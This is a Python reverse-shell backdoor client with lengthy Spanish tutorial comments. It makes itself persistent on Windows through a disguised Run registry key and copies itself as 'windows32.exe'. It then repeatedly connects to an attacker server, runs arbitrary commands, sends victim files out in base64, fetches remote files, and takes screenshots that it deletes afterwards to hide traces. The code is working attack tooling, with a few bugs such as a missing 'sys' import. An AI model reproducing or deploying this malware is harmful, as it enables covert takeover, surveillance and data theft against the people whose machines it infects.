#!/usr/bin/env python
#_*_coding: utf8 _*_

# la primera linea indica al sistema operativo que debe usar el intérprete de Python para ejecutar el script y la otra la zona horaria. en las siguientes librerias o modulos algunos para uqe funcionen mientras se programa deben ser descargadas en el sistema operativo para poder trabajar con ellas

import socket #Importa el módulo socket, que proporciona una interfaz para las conexiones de red.
import os #Importa el módulo os, que proporciona funciones para interactuar con el sistema operativo, como obtener el directorio actual de trabajo.
import subprocess #Importa el módulo subprocess, que permite ejecutar procesos desde el programa Python.
import base64 #El modulo base64, proporciona funciones para codificar datos binarios a caracteres ASCII imprimibles y decodificar tales codificaciones a datos binarios.
import requests #es una herramienta poderosa y fácil de usar para manejar solicitudes y respuestas HTTP
import mss #este modulo o libreria es para tomar screenshot
import time # libreria para el intervalo de tiempo entre conexiones (con esto logramos que cuando el servidor se desconecte el cliente se quede buscando nuevamente conectar al servidor en cuando este se ponga nuevamente en linea)
import shutil #provee funciones que dan soporte a la copia y remoción de archivos

def admin_check(): # con esta funcion checkearemos si tenemos permiso o provilegios de administrador
    global admin #definimos una variable global
    try: #tratamos de hacer lo siguiente
        check =os.listdir(os.sep.join([os.environ.get("SystemRoot","C:\Windows"),'temp'])) #tratamos de listar(listdir) y concatenar con (os.sep.join) esto de manera inteligente distinatas rutas a una absoluta en un directorio y con environ conseguimos hacer o retornar un diccionario que va contener rutas del sistema operativo incluyendo las variables de entorno PATH.  y con get conseguimos u obtenemos rutas especificas a travez de llave:valor de las carpetas especificas de .get("SystemRoot","C:\Windows") y temp lo pasamos por fuera para concatenarlo al final por medio tambien del os.sep.join EN CONCLUSION listamos un directorio que la maquina solo puede desde que tenga permisos de administrador y de ser asi pasara al else de lo contrario quiere decir que no es admin por no poderlo hacer y pasara al except
    except:
        admin = b"ERROR: privilegios insuficientes"
    else:
        admin = b"privilegios de administrador" #otorgandose todo a la variable admin que al ser global se puede enviar desde cualquier parte de la terminal 

def create_persistence(): #esta persistencia es solo para windows, la persistencia es la capacidad de dotar este programa o herramienta de la capacidad de permitir la autoejecucion por parte del sistema operativo(windows) ya que cuando dicha victima prenda el pc de una vez se ejecute el programa entero y se conecte al servidor. hay varias formas de crear persistencia, en este caso sera por medio de la modificacion de las claves del registro usando regedit(editor de registro(el cual editamos para que ejecute la herramienta todo el tiempo y mientras se inicia la pc(cabe mencionar que hay que pasar este programa a .exe)))lo que se va ha modificar es el adicionar la clave del registro que apunte a nuestra backdoor la cual va ha moverse a la ruta del sistema en especifico para que desde ahi se pueda ejecutar.vamos a guardar la clave del registro en el apartado de windows editor del registro ruta:(equipo\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run) ahi vamos a ñadir nuestra clave de registro para que se pueda autoiniciar la herramienta
    location = os.environ['appdata'] + '\\windows32.exe' #primero creamos una localizacion o ruta la cual va ha ser en la que este nuestro programa autoejecutable(.exe de executable) ruta en la que se va copiar y posteriormente se va añadir la clave de registro para que se pueda ejecutar. os.environ nos regresa un diccionario ya que os proporciona el modulo del sistema operativos y Y os.environ es un diccionario de variables de entorno. nombres de las variables de entorno y sus valores son las claves y valores del diccionario, respectivamente, De modo que puede acceder a los valores de las variables de entorno, utilizando (sus nombres como) las claves, tal como accedería a los elementos de un diccionario (llave=valor). siendo appdata la carpte y llave a la cual vamos acceder(lo mismo que si digitamos en windows la tecla windows + R y pusieramos appdata nos manda a una carpeta en la cual vamos a copiar nuestro pequeño ejecutable que se encargara de crear la persistencia ) posteriormente como appdata solo esta apuntando a un directorio le concatenamos con + el archivo de nombre inventado pero que sea .exe ya que en el se va copiar nuestra herramienta pero ya convertida en programa executable de windows (siendo esta la localizacion absoluta)
    if not os.path.exists(location): #aqui empezamos el objetivo de que dicha persistencia se haga solo una vez iniciada la pc y no mas sin repetirse: si no existe os.path(location) se va ejecutar la persistencia pero si ya existe no se debe de ejecutar nuevamente y asi no cree conflictos en maquina cliente, para ello lo primero a continuacion vamos a copiar nuestra backdoor a la ruta especificada para lo que necesitaremos un nuevo modulo llamado shutil
        shutil.copyfile(sys.executable,location) #shutil se encargara de copiar el archivo y recibe el parametro de el archivo y la ruta, para obtener el nombre con el cual se esta ejecutando el programa usamos la facil y es sys.executable (ya que windows reconoce este comando como solicitud del nombre que corre) y location es la location que hemos especificado un poco mas arriba
        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v control /t REG_SZ /d "' + location + '"', shell=True) #aqui añadimos la clave de registro para modificarla y que asi nuestra herramienta se ejecute al inicio de la maquina, subprocess lo que hace es:(Este módulo facilita la automatización de tareas y la integración de otros programas con tu código Python. Por ejemplo, puedes utilizar el módulo subproceso para ejecutar un comando shell, como "ls" o "ping", y obtener la salida de ese comando en tu código Python.) y call como su nombre lo indica una llamada y le pasamos por parametro reg add ya que es un comando que lee la consola de windows y HKCU significa(hKEY_CURRENT_USER)y seguimos especificando la ruta a donde queremos llegar y al final /v sera el nombre del registro que lo pondre control para no ser tan obvio con el nombre de backdoor y luego especificamos el tipo de registro es decir REG_SZ y finalmente concatenamos la direccion del archivo executable a ejecutar(en este caso location) y al final con el parametro shell=True es importante porque indica a python que es como si estuvieramos trabjando en una terminal, asi todo ese comando largo funcionara igual que si se ejecutara en un cmd. no olvidar al final del codigo mandar a llamar la funcion

def connection(): #funcion para el intervalo de tiempo entre conexiones
    while True: # hacemos nuestro bucle infinito para que siempre este buscando recuperar la conexion
        time.sleep(5)#este es un tiempo de espera entre busqueda de conexion
        try: # usamos nuevamente try para darnos cuenta de cualquier error en caso de que lo haya por medio de except
            cliente.connect(('192.168.1.130', 7777)) #Conecta el socket del cliente al servidor especificando la dirección IP y el puerto del servidor.
            shell() #Llama a la función shell()para interactuar con el servidor.
        except:
            connection() #esta exception lo que hace es que si no se conecta se vuelve a llamar a la funcion hasta que see conecte

def captura_pantalla(): #funcion para screenshot por parte del cliente ya que del lado del servidor ya esta echa 
    screen = mss.mss() #atribuimos el objeto mss del modulo mss a la variable screen
    screen.shot() #con solo usar el objeto shot ya abra tomado la captura y lo que sigue es enviarla y lo haremos por medio de otro elif

def download_file(url): #esta funcion recive como argumento la url que tiene que alojar el archivo que queremos descargar
    consulta = requests.get(url) #get puede varia depende del metodo que necesitemos es decir get Solicita información o un recurso concreto. Por ejemplo, cuando visitas un sitio web, tu navegador envía peticiones GET para cargar la página. a este get le pasamos la url que recibimos arriva donde escribimos url y a continuacion establecemos el nombre para el archivo
    name_file = url.split("/")[-1] #establecemos el nombre para el archivo, split nos permite generar ya sea una lista separada a base de algun caracter o bien obtener los datos a travez de esta tecnica y -1 es el para hacer referencia a que necesitamos el ultimo de dicha lista, por ejemplo: https://www.google.com/index.html el index seria el ultimo nombre del archivo a descargar ya que la direccion url esta separada por / cada seccion, por esto el split / -1 en la siguiente linea abrimos dicho archivo
    with open(name_file, 'wb') as file_get: # con with abrimos un archivo name_file como wb (escritura binar) para con as guardar el contenido de la respuesta en file_get para a continuacion escribir el contenido (.content) 
        file_get.write(consulta.content) #Consulta se vendria convirtindiendo asi en objeto que almacena los datos del archivo en cuestion que a su vez se almacenara en la clase .content  finalmente pondremos una opcions en la shelll para acceder a esto mas abajo en el codigo...
                            

def shell(): #Defina una función de llamada shell()que se encarga de interactuar con el servidor.
    current_dir = os.getcwd() #Obtiene el directorio actual de trabajo del cliente.
    cliente.send(current_dir.encode()) #Envía el directorio actual de trabajo codificado en bytes al servidor porque no se puede string como la palabra exit por si sola (Codifica la cadena de caracteres a bytes antes de enviarla).
    while True: #Comienza un bucle infinito para mantener la comunicación con el servidor activa hasta que se decida salir.
        respuesta = cliente.recv(1024) #Recibe los datos enviados por el servidor. respuesta es la variable que almacena los datos que vienen del servidor a diferencia de en servidor.py que la llamamos comando a la variable que almacena los datos que mandamos hacia aya
        if respuesta == b"exit": #Verifica si la respuesta del servidor indica que el cliente debe salir.
            break
        elif respuesta[:2] == b"cd" and len(respuesta) > 2: #esto lo ponemos al igual que lo pusimos en el servidor pero para recivir respuesta de este,si hata la posicion 2 de lo que tipiamos en consola fue cd pero and si la lengitud es mayor a 2, los datos siguientes a esa 2da posicion indicar el directorio al que pasamos de la siguiente manera
            os.chdir(respuesta[3:].decode())  # cambiamos de directorio a lo que venga despues del cd: del modulo oz utilizamos la funcion chdir(change dir o cd) que trae por parametro el dir al que nos vamos a cambiar y con posicion 3 hacia el final porque despues de esa posicion esta dicho directorio
            result = os.getcwd()  #obtenemos el direcctorio actual ya que el anteriormente usado solo estaba al momento de inicial shell pero ahora obtiene el actual con esta linea
            cliente.send(result.encode())  # Enviar lo anterior
        elif respuesta[:8] == b"download": # estamos repitiendo lo hecho en servidor para la descarga y escritura de archivos donde especificamos que si hasta el 8vo caracter es la palabra download abriremos ahora el archivo pedido en lectura binaria de la siguiente manera:
            with open(respuesta[9:].decode(),'rb') as file_download: # despues del caracter 9 especificariamos como usuario el archivo que queremos descargar abriendola con el modo de lectura binaria(read binary,rb)
                cliente.send(base64.b64encode(file_download.read())) #aqui enviamos los datos del archivo que estamos leyendo de esta victima encodeados ya que el servidor esta descodeando en base64 por lo que tambien debemos importar la biblioteca base 64
        elif respuesta[:6] == b"upload": # le decimos que si comando en sus primeras 6 letrras es upload haga lo siguiente(subir un archivo)
            with open (respuesta[7:].decode(),'wb') as file_upload: #vamos a crear un nuevo archivo con el nombre que tenga respuesta en modo binario al igual que en download, a diferencia de download aqui no leemos sino que escribimos(wb significa write binary) ya que estamos recibiendo y no enviando en esta ocasion deecimos que lo que va despues de la posicion 7 de la respuesta vendria siendo el nombre del archivo y se abre en escritura binary y finalmente con as lo atribuimos o metemos a una variable que llamaremos file_upload
                datos = cliente.recv(30000) # aqui apenas recibe la victima lo pedido por el atacante y en la siguiente linea lo escribimos(escribir entender como crear) y 30000 es el tamaño max de lo que se recibe y lo guardamos en datos
                file_upload.write(base64.b64decode(datos)) #como usamos base 64 para encodear los datos primero hay que descodearlos para escribirlos, asi bamos a escribir los datos pero antes pasarlos a b64 decode que es el formato en el que se va escribir y pasamos a programar esto de lado del servidor...
        elif respuesta[:3] == b"get": #decimos que si comando es get (palabra de hasta 3 caracteres) herramienta cliente entendera que va efectuar descarga
            try: #con try nos curamos en salud en caso de errores
                download_file(respuesta[4:].decode()) #en esta linea le indicamos a la funcion download cual es la pagina de donde va descargar. utilizamos decode porque: cuando recibes un comando de descarga (get), estás pasando la URL directamente a la función download_file, pero debes asegurarte de que sea una cadena de texto y no una cadena de bytes
                cliente.send(b"archivo descargado correctamente") #aqui le decimos al servidor que el archivo fue descargado correctamente y b significa que enviamos la respuesta codificada en bytes
            except Exception as e: #except maneja excepciones (errores) y se ejecuta cuando ocurre una excepción en el código dentro del bloque try, as e asigna la excepción a la variable e, lo que nos permite acceder a la información sobre la excepción.
                cliente.send(f"ocurrio un error en descarga: {str(e)} - Tipo de error: {type(e).__name__}".encode()) #cliente es un objeto que representa una conexión de red en este caso un socket). send(...) es un método que envía datos a través de esa conexión.En este caso, se envía un mensaje de error al cliente. la f indica que es cadena de formato (f-string) que combina varios valores en un mensaje no solo texto sino ejemplo variables tambien, {str(e)} muestra la descripción de la excepción como una cadena, {type(e).__name__} muestra el nombre de la clase de la excepción (por ejemplo, ‘TypeError’, ‘ValueError’, etc.).Las llaves { } se utilizan para incrustar valores, encode: Convierte la cadena de texto en una secuencia de bytes (formato que se puede enviar a través de la red).La necesidad de codificar y decodificar los datos al enviarlos a través de una conexión de red se debe a que las letras no pasaran de un lado para otro ya que recordemos que todos son luces bytes las que viajan siendo necesario transformar las letras en bytes y luego transofrmar los bytes en letras nuevamente dado que estás trabajando con una conexión de red que se basa en la transmisión de bytes, de lo contrario marcara error de tipos de datos
        elif respuesta[:10] == b"screenshot":
            try: # usamos nuevamente try para darnos cuenta de cualquier error en caso de que lo haya por medio de except
                captura_pantalla() # llamamos a nuestra funcion que recordemos ya habra tomado la pantalla en caso de que la ayamos asi solicitado desde el lado del servidor y a continuacion la vamos abrir para poder mandarla
                with open ("monitor-1.png", 'rb') as file_send: # simepre que usemos mss se creara el pantallazo con el nombre pantallazo-1.png sin importar que vayamos en la captura numero 20 o 240 ya que recordemos que en el servidor esta creado el contador pero este empieza apartir programamos desde el 1 y por tanto abrimos este archivo con open en modo de lectura binaria y guardado en file_Send
                    cliente.send(base64.b64encode(file_send.read())) #aqui mandamos los datos sin olvidar encodearlos en base 64 para que pasen al otro lado porque pasan bytes luces ninguna otra cosa de esta manera enviamos los datos al momento en que leemos todo read
                    os.remove("monitor-1.png")# aqui despues de enviar la imagen eliminamos la captura de pantalla porque al ser un ataque no es logico dejar dicha captura en el sistema de la victima por lo que hay que elimminarla y utilizamos os ya que es la herramienta que nos permite modificar dentro del sistema del cliente
            except: # finalmente la excepcion nos dira si ocurrio un error pero lo haremos con fail ya que en el servidor especificamos que si llega un fail desde cliente indicara que no fue posible tomar captura                
                cliente.send(base64.b64encode("fail")) #encodeado mandamos el error para poder que pase como con escupita
        elif respuesta[:5] == b"start": #reservamos la palabra start para abrir programas en la maquina cliente
            try:
                subprocess.Popen(respuesta[6:], shell=True) #para que no se quede pegado al ejecutar el comando no lo almacenamos en una variable sino que se Ejecuta el comando recibido del servidor como un nuevo proceso utilizando subprocess.Popen() y dentro de esta ejecutamos el comando y programa que es lo que hiria despues del 6 digito, son shell=true le indicamos a python que es como si estuviera trabajando en una terminal 
                cliente.send(b"programa iniciado con exito") # con esto nos aseguramos que nuestra terminal del servidor no se quede pegada o colgada con un mensaje 
            except Exception as e: 
                cliente.send(f"no se pudo iniciar el programa: {str(e)}".encode)
        elif respuesta[:5] == b"check":
            try:
                admin_check() #llamamos la funcion que validara los privilegios root
                cliente.send(admin) # si la funcion se ejecuto correctamente mandamos lo que se almacena en la varible cliente que a su vez manda a admin (variable global) que sera el except si no es root o el else si si lo es
            except:
                cliente.send(b"no se pudo realizar la verificacion de permisos de administrador") # en caso de que no se pueda ejecutar
        else:
            proc = subprocess.Popen(respuesta, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) #Ejecuta el comando recibido del servidor como un nuevo proceso utilizando subprocess.Popen().
            result = proc.stdout.read() + proc.stderr.read() #Lee la salida estándar y de error del proceso y las concatena en una llamada variable result.
            # actualmente no tenemos mensaje de error programado o de salida por lo que se cuelga el programa, vamo a ello :
            if len(result) == 0: #si la lengitud del result tipiado en consola llega ser igual a cero (nada,errornulo)vamos a:
                cliente.send(b"1")  #vamos a enviar algun mensaje al servidor como por ejemplo 1 y en caso contrario:
            else:
                cliente.send(result) #Envía la salida del comando de vuelta al servidor independientemente de buena o error y vamos al servidor para implementar algo similar


create_persistence() #llamamos a la funcion de persistencia desde antes de que trate conectarse a la maquina de esta manera ya se habra ñadido al registro para que cada vez que se apague y prenda la maquina tratara de conectarse al servidor
cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #Crea un objeto socket para el cliente utilizando la dirección IPv4 y TCP.
connection() #llamamos a la funcion
#ESTO LO COMENTAMOS PORQUE LO SUBIMOS A LA FUNCION CONECTION= cliente.connect(('192.168.1.130', 7777)) #Conecta el socket del cliente al servidor especificando la dirección IP y el puerto del servidor.
#ESTO LO COMENTAMOS PORQUE LO SUBIMOS A LA FUNCION CONECTION= shell() #Llama a la función shell()para interactuar con el servidor.
cliente.close() #Cierra el enchufe del cliente después de terminar la comunicación con el servidor.
